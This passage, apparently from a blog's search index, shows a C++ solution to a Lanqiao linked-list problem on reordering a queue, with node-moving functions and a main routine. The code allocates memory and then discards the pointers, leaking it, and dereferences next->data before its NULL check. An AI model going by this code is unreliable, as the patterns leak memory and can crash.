class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(s==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  LNode *t=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  LNode *q=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  s=L;</span><br><span class="line">  q=L;</span><br><span class="line">  <span class="keyword">while</span>(s-&gt;next-&gt;data!=x&amp;&amp;s-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">    s=s-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  t=s-&gt;next;</span><br><span class="line">  <span class="keyword">while</span>(q-&gt;data!=y&amp;&amp;q-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">    q=q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  s-&gt;next=s-&gt;next-&gt;next;</span><br><span class="line">  t-&gt;next=q-&gt;next;</span><br><span class="line">  q-&gt;next=t;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InsertXY</span><span class="params">(LinkList L,<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">  LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(s==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  LNode *t=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  LNode *q=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  s=L;</span><br><span class="line">  q=L;</span><br><span class="line">   <span class="keyword">while</span>(s-&gt;next-&gt;data!=x&amp;&amp;s-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">    s=s-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  t=s-&gt;next;</span><br><span class="line">  <span class="keyword">while</span>(q-&gt;next-&gt;data!=y&amp;&amp;q-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">    q=q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">   s-&gt;next=s-&gt;next-&gt;next;</span><br><span class="line">  t-&gt;next=q-&gt;next;</span><br><span class="line">  q-&gt;next=t;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">printfList</span><span class="params">(LinkList L)</span></span>&#123;</span><br><span class="line">  LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LNode));</span><br><span class="line">  s=L;</span><br><span class="line">  <span class="keyword">while</span>(s-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">    cout&lt;&lt;s-&gt;next-&gt;data&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    s=s-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 请在此输入您的代码</span></span><br><span class="line">  LinkList L;</span><br><span class="line">  <span class="built_in">InitList</span>(L);</span><br><span class="line">  LNode *p;</span><br><span class="line">  p=L;</span><br><span class="line">  <span class="type">int</span> n,m;cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">    <span class="built_in">InsertNextLNode</span>(p,i);</span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> x,y,z;</span><br><span class="line">  <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">    cin&gt;&gt;x&gt;&gt;y&gt;&gt;z;</span><br><span class="line">    <span class="keyword">if</span>(z==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">InsertYX</span>(L,x,y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="built_in">InsertXY</span>(L,x,y);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printfList</span>(L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.lanqiao.cn/problems/3255/learning/?page=1&first_category_id=1&tags=%E9%93%BE%E8%A1%A8&tag_relation=intersection&difficulty=20"><a href="https://www.lanqiao.cn/problems/3255/learning/?page=1&first_category_id=1&tags=%E9%93%BE%E8%A1%A8&tag_relation=intersection&difficulty=20">5.重新排队 - 蓝桥云课</a></a></p>
]]></content>
      <categories>
        <category>蓝桥题解</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>链表</tag>
        <tag>蓝桥题解</tag>
      </tags>
  </entry>
</search>
